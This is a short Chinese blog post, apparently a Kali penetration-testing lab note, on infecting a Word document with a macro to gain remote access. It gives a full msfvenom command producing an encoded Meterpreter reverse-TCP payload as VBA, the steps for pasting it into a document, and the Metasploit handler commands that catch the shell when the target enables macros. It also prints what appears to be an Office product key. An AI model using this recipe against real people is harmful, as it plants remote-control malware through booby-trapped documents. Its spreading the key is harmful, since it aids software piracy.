---
title: "宏感染word文档获取权限"
date: 2020-02-24T19:17:28+08:00
author: 姚先生
categories: ['Kali']
tags: ['安全渗透']
---

Metasploit利用宏感染word文档获取权限

<!--more-->



##  实验步骤

* 安装office

  >office的激活码: DBXYD-TF477-46YM4-W74MH-6YDQ8

* 生成宏代码

  ~~~
  msfvenom -a x86 --platform windows  -p windows/meterpreter/reverse_tcp -i 10 -e x86/shikata_ga_nai LHOST=192.168.1.130 LPORT=4444 -f vba-exe
  ~~~

* 新建宏 

* 复制第一段代码内容到宏编辑器中，保存后关闭宏编辑器窗口

* 复制第二段代码到word正文，然后保存文档

* 启动msf配置监听

~~~
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.130
run
background
sessions
~~~

* 目标机允许运行宏